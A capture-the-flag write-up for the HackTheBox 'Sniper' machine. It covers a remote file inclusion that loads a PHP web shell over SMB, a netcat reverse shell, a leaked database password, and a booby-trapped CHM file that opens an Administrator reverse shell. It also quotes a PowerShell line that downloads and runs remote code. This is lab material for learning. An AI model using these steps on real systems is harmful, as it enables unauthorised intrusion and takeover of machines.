# Sniper Write-Up
### Platform: HackTheBox | Difficulty: Medium | OS: Windows | IP: 10.10.10.151

![sniper](https://user-images.githubusercontent.com/62805453/85051024-7da63500-b186-11ea-8968-ff860896e338.png)

Sniper machine is retired now and I release my WriteUp about this machine.

Sniper is a medium level windows box and its IP address is 10.10.10.151. To solve this box you need to use a windows machine or use wine tool in Kali linux.

As always I scanned the target with Nmap:

I usually scan all ports without any specific flag:

``` $ nmap -vvv -p1-65535 -oN pall.txt 10.10.10.151 ```
![01-nmap](https://user-images.githubusercontent.com/62805453/85050908-57809500-b186-11ea-92e1-d51bf9bec59f.png)

The result shows that there are five ports open:

Then I grepped the file and put all open ports in one line and a comma between them:

``` $ cat pall.txt | cut -d “ “ -f1 | cut -d “/” f1 | grep “[1-9]” | xargs | sed ‘s/ /,/g’ ```

After cutting ports, I scanned all those open ports:

``` $ nmap -vvv -p80,135,139,445,49667 -sV -sC -oN sVC.txt 10.10.10.151 ```
![02-nmap](https://user-images.githubusercontent.com/62805453/85051301-dfff3580-b186-11ea-8791-f1bab610bbcd.png)

The result shows that we have an http which has a Microsoft IIS httpd 10.0 version, and some other ports which makes me think about SMB vulnerabilities in the system.

Then I checked if there is any website for this IP address:
![03-website](https://user-images.githubusercontent.com/62805453/85050925-5fd8d000-b186-11ea-8068-a6ce286a07e8.png)

A simple website with only two pages:

http://10.10.10.151/blog/index.php

http://10.10.10.151/user/index.php

So I decided to use Dirbuster for finding more pages:
![04-dirbuster](https://user-images.githubusercontent.com/62805453/85050927-60716680-b186-11ea-96d1-1bef2127e884.png)

While Dirbuster was working I tested SMB for finding a way to exploit the target, but I found nothing:

``` $ smbclient -U anonymous -L //10.10.10.151 ```

``` $ smbmap -u “” -p “” -H 10.10.10.151 ```

``` $ smbmap -u anonymous -p “” -H 10.10.10.151 ```
![05-smb](https://user-images.githubusercontent.com/62805453/85050929-60716680-b186-11ea-97ec-5bf26893250b.png)

I came back to Dirbuster and got nothing interesting from it, the only page which got my attention was db.php address which only shows a blank page:

http://10.10.10.151/user/db.php

So at the moment I decided to work on those login and blog pages. I started by login page and tried some random username passwords but non of them worked. Then I did some SQLinjection tests and still no way to get into the system:

![06-sqlinjection](https://user-images.githubusercontent.com/62805453/85050949-65ceb100-b186-11ea-8c1d-35b9b0889fa3.png)

There was another link which I hoped find something interesting in it:

http://10.10.10.151/blog/index.php

By looking at the menu I found another page which I had no doubt that it is the key to unlock the system: http://10.10.10.151/blog/?lang=blog-en.php 

At first, I tried path traversal attack using wfuzz tool which was unsuccessful.

``` $ wfuzz -c -w /root/tools/Script-payload/PayloadsAllTheThings/DirectoryTraversal/Intruder/directory_traversal.txt --hc 400,403,404 http://10.10.10.151/blog/?lang=FUZZ ```

![07-wfuzz](https://user-images.githubusercontent.com/62805453/85050952-66674780-b186-11ea-9256-74745071b241.png)

Then I used different techniques to get into the target machine and finally I found this page which helped me to connect to the system:

http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html

![08-mannuphp](https://user-images.githubusercontent.com/62805453/85050953-66674780-b186-11ea-89c4-cb4260d24610.png)

Install Samba server if you don’t have it on your machine:

``` $ sudo apt-get install samba ```

Create SMB share directory (in my case /var/www/html/pub/):

``` $ mkdir HTB/sniper.151/pub ``` ( you may want to make a directory in /var/www/html/ )

Configure permissions on newly created SMB share directory:

``` $ chmod 0555 HTB/sniper.151/pub ```

``` $ chown -R nobody:nogroup HTB/sniper.151/pub ```

Run below mentioned command to remove default content of SAMBA server config file:

``` $  echo > /etc/samba/smb.conf ```

Put below mentioned content in file "/etc/samba/smb.conf":

##### [global]

``` workgroup = WORKGROUP ```

``` server string = Samba Server %v ```

``` netbios name = indishell-lab ```

``` security = user ```

``` map to guest = bad user ```

``` name resolve order = bcast host ```

``` dns proxy = no ```

``` bind interfaces only = yes ```

##### [share] (remember this name)

``` path = /root/HTB/sniper.151/pub ```

``` writable = no ```

``` guest ok = yes ```

``` guest only = yes ```

``` read only = yes ```

``` directory mode = 0555 ```

``` force user = nobody ```


Now, restart SAMBA server to apply new configuration spcified in config file /etc/samba/smb.conf:

``` $ sudo service smbd start ```

Finally copied this php file in the /pub/ directory:

https://github.com/incredibleindishell/Mannu-Shell/blob/master/mannu.php

The last step for this part is to try to connect the target to our own machine:

http://10.10.10.151/blog/?lang=\\10.10.16.30\share\mannu.php

! share is the name that I mentioned in smb.conf file.

At this moment I could access the system as iusr user.

From the “CmD eXect” I could access cmd.exe and type my commands, and from the “DiReCtOrY cH cd” I could go to other directories. I found netcat executable file in c:\TEMP\ folder so I used it to get a shell:

``` nc64.exe -nv 10.10.16.30 58700 -e cmd.exe ```

##### ON KALI MACHINE:

``` $ nc -nlvp 58700 ```

And yes I got a shell and I didn’t have to deal with the webpage anymore!

After doing some enumeration I found a password in db.php file:

![09-dbphp](https://user-images.githubusercontent.com/62805453/85051826-8814fe80-b187-11ea-97fa-1bd9678f8c55.png)

So I tried to get into “Chris” via SSH, but it didn’t work.

Again I tried smbmap to see if there is any share folder:

``` $ smbmap -u chris -p "36mEAhz/B8xQ~2VM" -H 10.10.10.151 ```

But “IPC$” was the only share folder which had Read-Only permission.

Another way to test the password was switching to the user via CMD or Powershell.
As I didn’t know how to do it I decided to surf on the internet to find any useful command, finally found this website which helped me to get the USER FLAG but I was still unable to switch to Chris account: 

https://davidhamann.de/2019/12/08/running-command-different-user-powershell/

and I changed some elements:

![12-userflagonly](https://user-images.githubusercontent.com/62805453/85050988-72530980-b186-11ea-8638-bea9d47a3585.png)

Then with getting some helps from a friend I wrote a command to switch to “Chris” account via powershell:

![11-whoami](https://user-images.githubusercontent.com/62805453/85052414-6405ed00-b188-11ea-861c-fd456fd0c0a6.png)

After looking at some directories I found a file named “instructions.chm”, so I downloaded it into my Kali Linux machine via netcat, and open the file with kchmviewer tool:

![15-kchmviewer](https://user-images.githubusercontent.com/62805453/85051007-78e18100-b186-11ea-9872-5f24d99acd3e.png)

Then I downloaded the htmlhelp.exe file from microsoft website and installed it on windows machine: ( you can install it on your Kali machine using wine tool )

https://www.microsoft.com/en-us/download/details.aspx?id=21138

But I really didn’t know how to deal with instructions.chm file as it was my first experience to work with such an extension. So I searched on the internet and found this useful post and followed every steps:

https://github.com/yasinyilmaz/vuln-chm-hijack

I just changed this code:

``` <PARAM name="Item1" value=",powershell.exe, -nop -NoProfile -WindowsStyle 1 -c -IEX (New-Object Net.WebClient).DownloadString('{YOUR MALICIOUS FILE URL}')"> ```

TO:

``` <PARAM name="Item1" value=",cmd,/C C:\TEMP\nc64.exe -e powershell.exe 10.10.16.30 55400"> ```

By defining CMD in the code we are able to run any program we want, in this case nc64.exe.

At the end I compiled the file the way that the post shows and send it to my Kali machine and run the SimpleHTTPServer:

``` $ python -m SimpleHTTPServer 59800 ```

Then download instructions.chm in Sniper machine. (You can use your windows machine for doing all steps, just use Openvpn to connect to HackTheBox servers).

** Notice that the file that you compiled should have the same name as the original one: instructions.chm

In this moment you need to copy the file into “C:\Docs” directory, but before that run your netcat with your IPaddress and a port number. After running netcat and copying instructions.chm file in the Docs directory you get a reverse shell as the Administrator of the Sniper machine:

![16-root](https://user-images.githubusercontent.com/62805453/85051014-7b43db00-b186-11ea-88e9-3bbf572998d1.png)
